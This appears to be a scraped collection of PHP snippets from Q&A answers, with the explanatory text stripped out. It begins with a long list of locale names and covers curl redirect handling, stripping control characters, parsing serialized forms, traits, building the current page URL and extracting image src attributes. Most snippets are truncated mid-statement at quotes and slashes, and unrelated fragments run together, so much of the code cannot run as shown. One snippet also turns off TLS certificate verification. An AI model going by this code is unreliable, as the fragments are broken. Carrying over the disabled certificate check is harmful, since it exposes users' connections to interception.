de_BE@euro ISO-8859-15 de_CH.UTF-8 UTF-8 de_CH ISO-8859-1 de_DE.UTF-8 UTF-8 de_DE ISO-8859-1 de_DE@euro ISO-8859-15 de_LU.UTF-8 UTF-8 de_LU ISO-8859-1 de_LU@euro ISO-8859-15 dv_MV UTF-8 dz_BT UTF-8 el_GR.UTF-8 UTF-8 el_GR ISO-8859-7 el_CY.UTF-8 UTF-8 el_CY ISO-8859-7 en_AG UTF-8 en_AU.UTF-8 UTF-8 en_AU ISO-8859-1 en_BW.UTF-8 UTF-8 en_BW ISO-8859-1 en_CA.UTF-8 UTF-8 en_CA ISO-8859-1 en_DK.UTF-8 UTF-8 en_DK ISO-8859-1 en_GB.UTF-8 UTF-8 en_GB ISO-8859-1 en_HK.UTF-8 UTF-8 en_HK ISO-8859-1 en_IE.UTF-8 UTF-8 en_IE ISO-8859-1 en_IE@euro ISO-8859-15 en_IN UTF-8 en_NG UTF-8 en_NZ.UTF-8 UTF-8 en_NZ ISO-8859-1 en_PH.UTF-8 UTF-8 en_PH ISO-8859-1 en_SG.UTF-8 UTF-8 en_SG ISO-8859-1 en_US.UTF-8 UTF-8 en_US ISO-8859-1 en_ZA.UTF-8 UTF-8 en_ZA ISO-8859-1 en_ZM UTF-8 en_ZW.UTF-8 UTF-8 en_ZW ISO-8859-1 es_AR.UTF-8 UTF-8 es_AR ISO-8859-1 es_BO.UTF-8 UTF-8 es_BO ISO-8859-1 es_CL.UTF-8 UTF-8 es_CL ISO-8859-1 es_CO.UTF-8 UTF-8 es_CO ISO-8859-1 es_CR.UTF-8 UTF-8 es_CR ISO-8859-1 es_CU UTF-8 es_DO.UTF-8 UTF-8 es_DO ISO-8859-1 es_EC.UTF-8 UTF-8 es_EC ISO-8859-1 es_ES.UTF-8 UTF-8 es_ES ISO-8859-1 es_ES@euro ISO-8859-15 es_GT.UTF-8 UTF-8 es_GT ISO-8859-1 es_HN.UTF-8 UTF-8 es_HN ISO-8859-1 es_MX.UTF-8 UTF-8 es_MX ISO-8859-1 es_NI.UTF-8 UTF-8 es_NI ISO-8859-1 es_PA.UTF-8 UTF-8 es_PA ISO-8859-1 es_PE.UTF-8 UTF-8 es_PE ISO-8859-1 es_PR.UTF-8 UTF-8 es_PR ISO-8859-1 es_PY.UTF-8 UTF-8 es_PY ISO-8859-1 es_SV.UTF-8 UTF-8 es_SV ISO-8859-1 es_US.UTF-8 UTF-8 es_US ISO-8859-1 es_UY.UTF-8 UTF-8 es_UY ISO-8859-1 es_VE.UTF-8 UTF-8 es_VE ISO-8859-1 et_EE.UTF-8 UTF-8 et_EE ISO-8859-1 et_EE.ISO-8859-15 ISO-8859-15 eu_ES.UTF-8 UTF-8 eu_ES ISO-8859-1 eu_ES@euro ISO-8859-15 fa_IR UTF-8 ff_SN UTF-8 fi_FI.UTF-8 UTF-8 fi_FI ISO-8859-1 fi_FI@euro ISO-8859-15 fil_PH UTF-8 fo_FO.UTF-8 UTF-8 fo_FO ISO-8859-1 fr_BE.UTF-8 UTF-8 fr_BE ISO-8859-1 fr_BE@euro ISO-8859-15 fr_CA.UTF-8 UTF-8 fr_CA ISO-8859-1 fr_CH.UTF-8 UTF-8 fr_CH ISO-8859-1 fr_FR.UTF-8 UTF-8 fr_FR ISO-8859-1 fr_FR@euro ISO-8859-15 fr_LU.UTF-8 UTF-8 fr_LU ISO-8859-1 fr_LU@euro ISO-8859-15 fur_IT UTF-8 fy_NL UTF-8 fy_DE UTF-8 ga_IE.UTF-8 UTF-8 ga_IE ISO-8859-1 ga_IE@euro ISO-8859-15 gd_GB.UTF-8 UTF-8 gd_GB ISO-8859-15 gez_ER UTF-8 gez_ER@abegede UTF-8 gez_ET UTF-8 gez_ET@abegede UTF-8 gl_ES.UTF-8 UTF-8 gl_ES ISO-8859-1 gl_ES@euro ISO-8859-15 gu_IN UTF-8 gv_GB.UTF-8 UTF-8 gv_GB ISO-8859-1 ha_NG UTF-8 he_IL.UTF-8 UTF-8 he_IL ISO-8859-8 hi_IN UTF-8 hne_IN UTF-8 hr_HR.UTF-8 UTF-8 hr_HR ISO-8859-2 hsb_DE ISO-8859-2 hsb_DE.UTF-8 UTF-8 ht_HT UTF-8 hu_HU.UTF-8 UTF-8 hu_HU ISO-8859-2 hy_AM UTF-8 hy_AM.ARMSCII-8 ARMSCII-8 id_ID.UTF-8 UTF-8 id_ID ISO-8859-1 ig_NG UTF-8 ik_CA UTF-8 is_IS.UTF-8 UTF-8 is_IS ISO-8859-1 it_CH.UTF-8 UTF-8 it_CH ISO-8859-1 it_IT.UTF-8 UTF-8 it_IT ISO-8859-1 it_IT@euro ISO-8859-15 iu_CA UTF-8 iw_IL.UTF-8 UTF-8 iw_IL ISO-8859-8 ja_JP.EUC-JP EUC-JP ja_JP.UTF-8 UTF-8 ka_GE.UTF-8 UTF-8 ka_GE GEORGIAN-PS kk_KZ.UTF-8 UTF-8 kk_KZ PT154 kl_GL.UTF-8 UTF-8 kl_GL ISO-8859-1 km_KH UTF-8 kn_IN UTF-8 ko_KR.EUC-KR EUC-KR ko_KR.UTF-8 UTF-8 kok_IN UTF-8 ks_IN UTF-8 ks_IN@devanagari UTF-8 ku_TR.UTF-8 UTF-8 ku_TR ISO-8859-9 kw_GB.UTF-8 UTF-8 kw_GB ISO-8859-1 ky_KG UTF-8 lb_LU UTF-8 lg_UG.UTF-8 UTF-8 lg_UG ISO-8859-10 li_BE UTF-8 li_NL UTF-8 lij_IT UTF-8 lo_LA UTF-8 lt_LT.UTF-8 UTF-8 lt_LT ISO-8859-13 lv_LV.UTF-8 UTF-8 lv_LV ISO-8859-13 mag_IN UTF-8 mai_IN UTF-8 mg_MG.UTF-8 UTF-8 mg_MG ISO-8859-15 mhr_RU UTF-8 mi_NZ.UTF-8 UTF-8 mi_NZ ISO-8859-13 mk_MK.UTF-8 UTF-8 mk_MK ISO-8859-5 ml_IN UTF-8 mn_MN UTF-8 mr_IN UTF-8 ms_MY.UTF-8 UTF-8 ms_MY ISO-8859-1 mt_MT.UTF-8 UTF-8 mt_MT ISO-8859-3 my_MM UTF-8 nan_TW@latin UTF-8 nb_NO.UTF-8 UTF-8 nb_NO ISO-8859-1 nds_DE UTF-8 nds_NL UTF-8 ne_NP UTF-8 nl_AW UTF-8 nl_BE.UTF-8 UTF-8 nl_BE ISO-8859-1 nl_BE@euro ISO-8859-15 nl_NL.UTF-8 UTF-8 nl_NL ISO-8859-1 nl_NL@euro ISO-8859-15 nn_NO.UTF-8 UTF-8 nn_NO ISO-8859-1 nr_ZA UTF-8 nso_ZA UTF-8 oc_FR.UTF-8 UTF-8 oc_FR ISO-8859-1 om_ET UTF-8 om_KE.UTF-8 UTF-8 om_KE ISO-8859-1 or_IN UTF-8 os_RU UTF-8 pa_IN UTF-8 pa_PK UTF-8 pap_AN UTF-8 pl_PL.UTF-8 UTF-8 pl_PL ISO-8859-2 ps_AF UTF-8 pt_BR.UTF-8 UTF-8 pt_BR ISO-8859-1 pt_PT.UTF-8 UTF-8 pt_PT ISO-8859-1 pt_PT@euro ISO-8859-15 ro_RO.UTF-8 UTF-8 ro_RO ISO-8859-2 ru_RU.KOI8-R KOI8-R ru_RU.UTF-8 UTF-8 ru_RU ISO-8859-5 ru_UA.UTF-8 UTF-8 ru_UA KOI8-U rw_RW UTF-8 sa_IN UTF-8 sc_IT UTF-8 sd_IN UTF-8 sd_IN@devanagari UTF-8 se_NO UTF-8 shs_CA UTF-8 si_LK UTF-8 sid_ET UTF-8 sk_SK.UTF-8 UTF-8 sk_SK ISO-8859-2 sl_SI.UTF-8 UTF-8 sl_SI ISO-8859-2 so_DJ.UTF-8 UTF-8 so_DJ ISO-8859-1 so_ET UTF-8 so_KE.UTF-8 UTF-8 so_KE ISO-8859-1 so_SO.UTF-8 UTF-8 so_SO ISO-8859-1 sq_AL.UTF-8 UTF-8 sq_AL ISO-8859-1 sq_MK UTF-8 sr_ME UTF-8 sr_RS UTF-8 sr_RS@latin UTF-8 ss_ZA UTF-8 st_ZA.UTF-8 UTF-8 st_ZA ISO-8859-1 sv_FI.UTF-8 UTF-8 sv_FI ISO-8859-1 sv_FI@euro ISO-8859-15 sv_SE.UTF-8 UTF-8 sv_SE ISO-8859-1 sw_KE UTF-8 sw_TZ UTF-8 ta_IN UTF-8 ta_LK UTF-8 te_IN UTF-8 tg_TJ.UTF-8 UTF-8 tg_TJ KOI8-T th_TH.UTF-8 UTF-8 th_TH TIS-620 ti_ER UTF-8 ti_ET UTF-8 tig_ER UTF-8 tk_TM UTF-8 tl_PH.UTF-8 UTF-8 tl_PH ISO-8859-1 tn_ZA UTF-8 tr_CY.UTF-8 UTF-8 tr_CY ISO-8859-9 tr_TR.UTF-8 UTF-8 tr_TR ISO-8859-9 ts_ZA UTF-8 tt_RU UTF-8 tt_RU@iqtelif UTF-8 ug_CN UTF-8 uk_UA.UTF-8 UTF-8 uk_UA KOI8-U unm_US UTF-8 ur_IN UTF-8 ur_PK UTF-8 uz_UZ ISO-8859-1 uz_UZ@cyrillic UTF-8 ve_ZA UTF-8 vi_VN UTF-8 wa_BE ISO-8859-1 wa_BE@euro ISO-8859-15 wa_BE.UTF-8 UTF-8 wae_CH UTF-8 wal_ET UTF-8 wo_SN UTF-8 xh_ZA.UTF-8 UTF-8 xh_ZA ISO-8859-1 yi_US.UTF-8 UTF-8 yi_US CP1255 yo_NG UTF-8 yue_HK UTF-8 zh_CN.GB18030 GB18030 zh_CN.GBK GBK zh_CN.UTF-8 UTF-8 zh_CN GB2312 zh_HK.UTF-8 UTF-8 zh_HK BIG5-HKSCS zh_SG.UTF-8 UTF-8 zh_SG.GBK GBK zh_SG GB2312 zh_TW.EUC-TW EUC-TW zh_TW.UTF-8 UTF-8 zh_TW BIG5 zu_ZA.UTF-8 UTF-8 zu_ZA ISO-8859-1
<?php print_r(ResourceBundle::getLocales( /* Output might show * Array * ( * [0] => af * [1] => af_NA * [2] => af_ZA * [3] => am * [4] => am_ET * [5] => ar * [6] => ar_AE * [7] => ar_BH * [8] => ar_DZ * [9] => ar_EG * [10] => ar_IQ * ... */ ?>
"require-dev": { "codeception/codeception": "1.6.0.3" }
composer.phar install --no-dev --optimize-autoloader
composer.phar install --no-ansi --no-dev --no-interaction --no-progress --no-scripts --optimize-autoloader
<?php /* * Escaping the reverse-solidus character ("/", slash) is optional in JSON. * * This can be controlled with the JSON_UNESCAPED_SLASHES flag constant in PHP. * * @link http: */ $url = echo json_encode($url), "\n"; echo json_encode($url, JSON_UNESCAPED_SLASHES), "\n";
function npcID($name) { $urltopost = "http: $ch = curl_init(); curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1"); curl_setopt($ch, CURLOPT_URL, $urltopost); curl_setopt($ch, CURLOPT_REFERER, "http: curl_setopt($ch, CURLOPT_HTTPHEADER, Array("Content-Type:application/x-www-form-urlencoded")); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE); return curl_getinfo($ch, CURLINFO_EFFECTIVE_URL); }
$ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_HEADER, true); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $result = curl_exec($ch); if (preg_match( $location = trim($match[1]); }
$redirectURL = curl_getinfo($ch,CURLINFO_EFFECTIVE_URL );
$ch = curl_init($url); curl_setopt($ch, CURLOPT_HEADER, false); curl_setopt($ch, CURLOPT_USERAGENT, curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_BINARYTRANSFER, true); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); curl_setopt($ch, CURLOPT_CONNECTTIMEOUT ,0); curl_setopt($ch, CURLOPT_TIMEOUT, 60); $html = curl_exec($ch); $redirectURL = curl_getinfo($ch,CURLINFO_EFFECTIVE_URL ); curl_close($ch);
$ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_HEADER, true); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false); curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE); $a = curl_exec($ch); curl_close( $ch ); $headers = explode("\n",$a); $redir = $url; $j = count($headers); for($i = 0; $i < $j; $i++){ if(strpos($headers[$i],"Location:") !== false){ $redir = trim(str_replace("Location:","",$headers[$i])); break; } } echo redir;
function getOriginalURL($url) { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_HEADER, true); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false); curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE); $result = curl_exec($ch); $httpStatus = curl_getinfo($ch, CURLINFO_HTTP_CODE); curl_close($ch); if ($httpStatus < 300 || $httpStatus >= 400) return $url; if(preg_match( $location = trim($r[1]); if (preg_match( $urlParts = parse_url($url); if ($urlParts[ $baseURL = $urlParts[ if ($urlParts[ $baseURL .= $urlParts[ if ($urlParts[ $baseURL .= return $baseURL.$location; } return $location; } return $url; }
<?php class curl { static private $cookie_file = static private $user_agent = static private $max_redirects = 10; static private $followlocation_allowed = true; function __construct() { self::$cookie_file = self::$user_agent = if ( ! file_exists(self::$cookie_file) || ! is_writable(self::$cookie_file)) { throw new Exception( } if (ini_get( { self::$followlocation_allowed = false; } } /** * Main method for GET requests * @param string $url URI to get * @return string request */ static public function get($url) { $process = curl_init($url); self::_set_basic_options($process); curl_setopt($process, CURLOPT_HEADER, 0); if (self::$followlocation_allowed) { curl_setopt($process, CURLOPT_FOLLOWLOCATION, true); curl_setopt($process, CURLOPT_MAXREDIRS, self::$max_redirects); } else { curl_setopt($process, CURLOPT_FOLLOWLOCATION, false); } $return = curl_exec($process); if ($return === false) { throw new Exception( } $code = curl_getinfo($process, CURLINFO_HTTP_CODE); if ($code == 301 || $code == 302) { curl_close($process); try { $location = self::_parse_redirection_header($url); } catch (Exception $e) { throw $e; } return self::get($location); } curl_close($process); return $return; } static function _set_basic_options($process) { curl_setopt($process, CURLOPT_USERAGENT, self::$user_agent); curl_setopt($process, CURLOPT_COOKIEFILE, self::$cookie_file); curl_setopt($process, CURLOPT_COOKIEJAR, self::$cookie_file); curl_setopt($process, CURLOPT_RETURNTRANSFER, 1); } static function _parse_redirection_header($url) { $process = curl_init($url); self::_set_basic_options($process); curl_setopt($process, CURLOPT_HEADER, 1); $return = curl_exec($process); if ($return === false) { throw new Exception( } curl_close($process); if ( ! preg_match( { throw new Exception( } if (self::$max_redirects-- <= 0) { throw new Exception( } return trim($location[1]); } }
$redirectURL = curl_getinfo($ch,CURLINFO_REDIRECT_URL);
$badchar=array( chr(0), chr(1), chr(2), chr(3), chr(4), chr(5), chr(6), chr(7), chr(8), chr(9), chr(10), chr(11), chr(12), chr(13), chr(14), chr(15), chr(16), chr(17), chr(18), chr(19), chr(20), chr(21), chr(22), chr(23), chr(24), chr(25), chr(26), chr(27), chr(28), chr(29), chr(30), chr(31), chr(127) ); $str2 = str_replace($badchar,
2 chars str_replace 5.3439ms preg_replace 2.9919ms preg_replace is 44.01% faster 4 chars str_replace 6.0701ms preg_replace 1.4119ms preg_replace is 76.74% faster 8 chars str_replace 5.8119ms preg_replace 2.0721ms preg_replace is 64.35% faster 16 chars str_replace 6.0401ms preg_replace 2.1980ms preg_replace is 63.61% faster 32 chars str_replace 6.0320ms preg_replace 2.6770ms preg_replace is 55.62% faster 64 chars str_replace 7.4198ms preg_replace 4.4160ms preg_replace is 40.48% faster 128 chars str_replace 12.7239ms preg_replace 7.5412ms preg_replace is 40.73% faster 256 chars str_replace 19.8820ms preg_replace 17.1330ms preg_replace is 13.83% faster 512 chars str_replace 34.3399ms preg_replace 34.0221ms preg_replace is 0.93% faster 1024 chars str_replace 57.1141ms preg_replace 67.0300ms str_replace is 14.79% faster 2048 chars str_replace 94.7111ms preg_replace 123.3189ms str_replace is 23.20% faster 4096 chars str_replace 227.7029ms preg_replace 258.3771ms str_replace is 11.87% faster 8192 chars str_replace 506.3410ms preg_replace 555.6269ms str_replace is 8.87% faster 16384 chars str_replace 1116.8811ms preg_replace 1098.0589ms preg_replace is 1.69% faster 32768 chars str_replace 2299.3128ms preg_replace 2222.8632ms preg_replace is 3.32% faster
$string = filter_var($input, FILTER_UNSAFE_RAW, FILTER_FLAG_STRIP_LOW);
$string = filter_var($input, FILTER_UNSAFE_RAW, FILTER_FLAG_STRIP_HIGH);
$string = filter_var($input, FILTER_UNSAFE_RAW, FILTER_FLAG_STRIP_LOW|FILTER_FLAG_STRIP_HIGH);
$string = filter_var($input, FILTER_UNSAFE_RAW, FILTER_FLAG_ENCODE_LOW|FILTER_FLAG_STRIP_HIGH);
function clean_string($string) { $s = trim($string); $s = iconv("UTF-8", "UTF-8 $s = preg_replace( $s = preg_replace( return $s; }
$string = str_replace(array( chr(0), chr(1), chr(2), chr(3), chr(4), chr(5), chr(6), chr(7), chr(8), chr(9), chr(10), chr(11), chr(12), chr(13), chr(14), chr(15), chr(16), chr(17), chr(18), chr(19), chr(20), chr(21), chr(22), chr(23), chr(24), chr(25), chr(26), chr(27), chr(28), chr(29), chr(30), chr(31), chr(127) ),
$escaped = EscapeNonASCII($string); $unescaped = UnescapeNonASCII($string);
<?php function EscapeNonASCII($string) { $hexbytes = strtoupper(bin2hex($string)); $i = 0; while ($i < strlen($hexbytes)) { $hexpair = substr($hexbytes, $i, 2); $decimal = hexdec($hexpair); if ($decimal < 32 || $decimal > 126) { $top = substr($hexbytes, 0, $i); $escaped = EscapeHex($hexpair); $bottom = substr($hexbytes, $i + 2); $hexbytes = $top . $escaped . $bottom; $i += 8; } $i += 2; } $string = hex2bin($hexbytes); return $string; } function EscapeHex($string) { $x = "5C5C78"; $topnibble = bin2hex($string[0]); $bottomnibble = bin2hex($string[1]); $escaped = $x . $topnibble . $bottomnibble; return $escaped; } function UnescapeNonASCII($string) { $stringtohex = bin2hex($string); $stringtohex = preg_replace_callback( return hex2bin($m[1]); }, $stringtohex); return hex2bin(strtoupper($stringtohex)); } ?>
use ForceUTF8\Encoding; $string = Encoding::fixUTF8($string);
function string2Slug($str){ $str = trim($str); $str = str_replace(" ","_",$str); $temp = explode("\\u",$str); $str = foreach ($temp as $bit) { $str .= substr($bit,4); } $str = str_replace(" $str = str_replace("\"","",$str); $str = str_replace("\\","",$str); $str = str_replace("\/","",$str); $str = str_replace("/","",$str); $str = str_replace("?","",$str); $str = str_replace(" $str = str_replace("&","",$str); $str = str_replace("%","",$str); $str = str_replace("!","",$str); return $str; }
parse_str($_POST[arraydata], $searcharray); print_r($searcharray);
Array ( [A] => 1 [B] => 2 [C] => 3 [D] => 4 [E] => 5 [F] => 6 [G] => 7 [H] => 8 )
<script> function insert_tag() { $.ajax({ url: "aaa.php", type: "POST", data: { ssd: "yes", data: $(" }, dataType: "JSON", success: function (jsonStr) { $(" } }); } </script> <form id="form_insert"> <input type="text" name="f1" value="a"/> <input type="text" name="f2" value="b"/> <input type="text" name="f3" value="c"/> <input type="text" name="f4" value="d"/> <div onclick="insert_tag();"><b>OK</b></div> <div id="result1">...</div> </form>
<?php if(isset($_POST[ { parse_str($_POST[ $data = array( "back_message" => $searcharray[ ); echo json_encode($data); } ?>
function unserializeForm($str) { $returndata = array(); $strArray = explode("&", $str); $i = 0; foreach ($strArray as $item) { $array = explode("=", $item); $returndata[$array[0]] = $array[1]; } return $returndata; }
function unserializeForm($str) { $strArray = explode("&", $str); foreach($strArray as $item) { $array = explode("=", $item); $returndata[] = $array; } return $returndata; }
$get = explode( foreach ( $get as $key => $value) { $need[ substr( $value, 0 , strpos( $value, } var_dump( $need[
$.ajax({ type: url: your url, data: $( success: function(data) { $( } });
function xyz($strfromAjaxPOST) { $array = ""; $returndata = ""; $strArray = explode("&", $strfromPOST); $i = 0; foreach ($strArray as $str) { $array = explode("=", $str); $returndata[$i] = $array[0]; $i = $i + 1; $returndata[$i] = $array[1]; $i = $i + 1; } print_r($returndata); }
Array ( [0] => attribute1 [1] => value1 [2] => attribute2 [3] => value2 [4] => attribute3 [5] => value3 )
<form id="login_form"> <input type="text" name="username" id="a"/> <input type="password" name="password" id="b"/> <button type="button" onclick="login()">Submit</button> </form>
$(document).ready(function(){}); function login(){ var obj = $( $.post( alert(res); }) }
<?php if(!empty($POST[ $user = $POST[ $pass = $POST[ $res = "Username : ".$user." || Password : ".$pass; return $res; } ?>
class ClassName { protected $logger; public function __construct(LoggerInterface $logger) { $this->logger = $logger; } public function setLogger(LoggerInterface $logger) { $this->logger = $logger; } }
interface Logger { public function log($message, $level); } class DemoLogger implements Logger { public function log($message, $level) { echo "Logged message: $message with level $level", PHP_EOL; } } trait Loggable { protected $logger; public function setLogger(Logger $logger) { $this->logger = $logger; } public function log($message, $level) { $this->logger->log($message, $level); } } class Foo implements Logger { use Loggable; }
$foo = new Foo; $foo->setLogger(new DemoLogger); $foo->log(
trait T { protected function foo() {} } class A { public function foo() {} } class B extends A { use T; }
trait T { public function foo() { return 1; } } class A { use T; public function foo() { return 2; } } $a = new A; echo $a->foo();
class A { use T; protected $prop = 1; protected function getProp() { return $this->prop; } } trait T { public function foo() { return $this->getProp(); } } $a = new A; echo $a->foo();
<?php trait SortStrategy { private $sort_field = null; private function string_asc($item1, $item2) { return strnatcmp($item1[$this->sort_field], $item2[$this->sort_field]); } private function string_desc($item1, $item2) { return strnatcmp($item2[$this->sort_field], $item1[$this->sort_field]); } private function num_asc($item1, $item2) { if ($item1[$this->sort_field] == $item2[$this->sort_field]) return 0; return ($item1[$this->sort_field] < $item2[$this->sort_field] ? -1 : 1 ); } private function num_desc($item1, $item2) { if ($item1[$this->sort_field] == $item2[$this->sort_field]) return 0; return ($item1[$this->sort_field] > $item2[$this->sort_field] ? -1 : 1 ); } private function date_asc($item1, $item2) { $date1 = intval(str_replace( $date2 = intval(str_replace( if ($date1 == $date2) return 0; return ($date1 < $date2 ? -1 : 1 ); } private function date_desc($item1, $item2) { $date1 = intval(str_replace( $date2 = intval(str_replace( if ($date1 == $date2) return 0; return ($date1 > $date2 ? -1 : 1 ); } } class Product { public $data = array(); use SortStrategy; public function get() { $this->data = array( 101222 => array( 101232 => array( 101241 => array( 101256 => array( 101219 => array( ); } public function sort_by($by = if (!preg_match( switch ($by) { case $this->sort_field = uasort($this->data, array( break; case $this->sort_field = uasort($this->data, array( break; default: $this->sort_field = uasort($this->data, array( } } } $product = new Product(); $product->get(); $product->sort_by( echo ?>
trait ReadOnly{ protected $readonly = false; public function setReadonly($value){ $this->readonly = (bool)$value; } public function getReadonly($value){ return $this->readonly; } }
$pageURL = (@$_SERVER["HTTPS"] == "on") ? "https: if ($_SERVER["SERVER_PORT"] != "80") { $pageURL .= $_SERVER["SERVER_NAME"].":".$_SERVER["SERVER_PORT"].$_SERVER["REQUEST_URI"]; } else { $pageURL .= $_SERVER["SERVER_NAME"].$_SERVER["REQUEST_URI"]; } return $pageURL;
RewriteEngine On RewriteCond %{HTTP_HOST} !(^stackoverflow.com*)$ RewriteRule (.*) https:
class VirtualDirectory { var $protocol; var $site; var $thisfile; var $real_directories; var $num_of_real_directories; var $virtual_directories = array(); var $num_of_virtual_directories = array(); var $baseURL; var $thisURL; function VirtualDirectory() { $this->protocol = $_SERVER[ $this->site = $this->protocol . $this->thisfile = basename($_SERVER[ $this->real_directories = $this->cleanUp(explode("/", str_replace($this->thisfile, "", $_SERVER[ $this->num_of_real_directories = count($this->real_directories); $this->virtual_directories = array_diff($this->cleanUp(explode("/", str_replace($this->thisfile, "", $_SERVER[ $this->num_of_virtual_directories = count($this->virtual_directories); $this->baseURL = $this->site . "/" . implode("/", $this->real_directories) . "/"; $this->thisURL = $this->baseURL . implode("/", $this->virtual_directories) . "/"; } function cleanUp($array) { $cleaned_array = array(); foreach($array as $key => $value) { $qpos = strpos($value, "?"); if($qpos !== false) { break; } if($key != "" && $value != "") { $cleaned_array[] = $value; } } return $cleaned_array; } } $virdir = new VirtualDirectory(); echo $virdir->thisURL;
function my_url(){ $url = (!empty($_SERVER[ "https: "http: echo $url; }
function get_current_url() { $protocol = if ($_SERVER[ $protocol .= $protocol_port = $_SERVER[ } else { $protocol_port = 80; } $host = $_SERVER[ $port = $_SERVER[ $request = $_SERVER[ $query = isset($_SERVER[ $toret = $protocol . return $toret; }
if (!function_exists( function base_url($atRoot=FALSE, $atCore=FALSE, $parse=FALSE){ if (isset($_SERVER[ $http = isset($_SERVER[ $hostname = $_SERVER[ $dir = str_replace(basename($_SERVER[ $core = preg_split( $core = $core[0]; $tmplt = $atRoot ? ($atCore ? "%s: $end = $atRoot ? ($atCore ? $core : $hostname) : ($atCore ? $core : $dir); $base_url = sprintf( $tmplt, $http, $hostname, $end ); } else $base_url = if ($parse) { $base_url = parse_url($base_url); if (isset($base_url[ } return $base_url; } }
echo base_url(); echo base_url(TRUE); echo base_url(TRUE, TRUE); || echo base_url(NULL, TRUE); echo base_url(NULL, NULL, TRUE);
<?php function currentPageURL() { $curpageURL = if ($_SERVER["HTTPS"] == "on") { $curpageURL.= "s"; } $curpageURL.= ": if ($_SERVER["SERVER_PORT"] != "80") { $curpageURL.= $_SERVER["SERVER_NAME"].":".$_SERVER["SERVER_PORT"].$_SERVER["REQUEST_URI"]; } else { $curpageURL.= $_SERVER["SERVER_NAME"].$_SERVER["REQUEST_URI"]; } return $curpageURL; } echo currentPageURL(); ?>
/* * Compatibility with multiple host headers. * Support of "Reverse Proxy" configurations. * * Michael Jett <mjett@mitre.org> */ function base_url() { $protocol = @$_SERVER[ ?: @$_SERVER[ ?: ((isset($_SERVER["HTTPS"]) && $_SERVER["HTTPS"] == "on") ? "https" : "http"); $port = @intval($_SERVER[ ?: @intval($_SERVER["SERVER_PORT"]) ?: (($protocol === $host = @explode(":", $_SERVER[ ?: @$_SERVER[ ?: @$_SERVER[ $port = ($protocol === return sprintf( }
function mymodule_tool($sting="page title"){ $out = $out .= _mymodule_tool_decor($sting); return $out; } function _mymodule_tool_decor($sting){ return }
public function convert_text() private function _convert_text()
class A { protected $_iAmAProtectedVariable; protected function _iAmAProtectedMethod() { } private $_iAmAPrivateVariable; private function _iAmAPrivateMethod() { } }
<img src="/image/fluffybunny.jpg" title="Harvey the bunny" alt="a cute little fluffy bunny" />
preg_match_all( print_r($result); Array ( [0] => Array ( [0] => <img src="/Content/Img/stackoverflow-logo-250.png" width="250" height="70" alt="logo link to homepage" /> [1] => <img class="vote-up" src="/content/img/vote-arrow-up.png" alt="vote up" title="This was helpful (click again to undo)" /> [2] => <img class="vote-down" src="/content/img/vote-arrow-down.png" alt="vote down" title="This was not helpful (click again to undo)" /> [3] => <img src="http: [4] => <img class="vote-up" src="/content/img/vote-arrow-up.png" alt="vote up" title="This was helpful (click again to undo)" /> [...] ) )
$img = array(); foreach( $result as $img_tag) { preg_match_all( } print_r($img); Array ( [<img src="/Content/Img/stackoverflow-logo-250.png" width="250" height="70" alt="logo link to homepage" />] => Array ( [0] => Array ( [0] => src="/Content/Img/stackoverflow-logo-250.png" [1] => alt="logo link to homepage" ) [1] => Array ( [0] => src [1] => alt ) [2] => Array ( [0] => "/Content/Img/stackoverflow-logo-250.png" [1] => "logo link to homepage" ) ) [<img class="vote-up" src="/content/img/vote-arrow-up.png" alt="vote up" title="This was helpful (click again to undo)" />] => Array ( [0] => Array ( [0] => src="/content/img/vote-arrow-up.png" [1] => alt="vote up" [2] => title="This was helpful (click again to undo)" ) [1] => Array ( [0] => src [1] => alt [2] => title ) [2] => Array ( [0] => "/content/img/vote-arrow-up.png" [1] => "vote up" [2] => "This was helpful (click again to undo)" ) ) [<img class="vote-down" src="/content/img/vote-arrow-down.png" alt="vote down" title="This was not helpful (click again to undo)" />] => Array ( [0] => Array ( [0] => src="/content/img/vote-arrow-down.png" [1] => alt="vote down" [2] => title="This was not helpful (click again to undo)" ) [1] => Array ( [0] => src [1] => alt [2] => title ) [2] => Array ( [0] => "/content/img/vote-arrow-down.png" [1] => "vote down" [2] => "This was not helpful (click again to undo)" ) ) [<img src="http: ( [0] => Array ( [0] => src="http: [1] => alt="gravatar image" ) [1] => Array ( [0] => src [1] => alt ) [2] => Array ( [0] => "http: [1] => "gravatar image" ) ) [..] ) )
$url="http: $html = file_get_contents($url); $doc = new DOMDocument(); @$doc->loadHTML($html); $tags = $doc->getElementsByTagName( foreach ($tags as $tag) { echo $tag->getAttribute( }
$doc=new DOMDocument(); $doc->loadHTML("<html><body>Test<br><img src=\"myimage.jpg\" title=\"title\" alt=\"alt\"></body></html>"); $xml=simplexml_import_dom($doc); $images=$xml->xpath( foreach ($images as $img) { echo $img[ }
<?php $input = $sx = simplexml_load_string($input); var_dump($sx); ?>
object(SimpleXMLElement) ["@attributes"]=> array(3) { ["src"]=> string(22) "/image/fluffybunny.jpg" ["title"]=> string(16) "Harvey the bunny" ["alt"]=> string(26) "a cute little fluffy bunny" } }
$url="http: $html = file_get_contents($url); $doc = new DOMDocument(); @$doc->loadHTML($html); $tags = $doc->getElementsByTagName( foreach ($tags as $tag) { echo $tag->getAttribute( }
foreach (glob("path/to/files/*.html") as $html) { $doc = new DOMDocument(); $doc->loadHTML($html); $tags = $doc->getElementsByTagName( foreach ($tags as $tag) { echo $tag->getAttribute( } }
$html = file_get_html( foreach($html->find( echo $element->src . foreach($html->find( echo $element->href .
$image = get_the_post_thumbnail($photos[$i]->ID); $pattern = preg_match($pattern, $image, $matches); $src = $matches[1]; unset($matches);
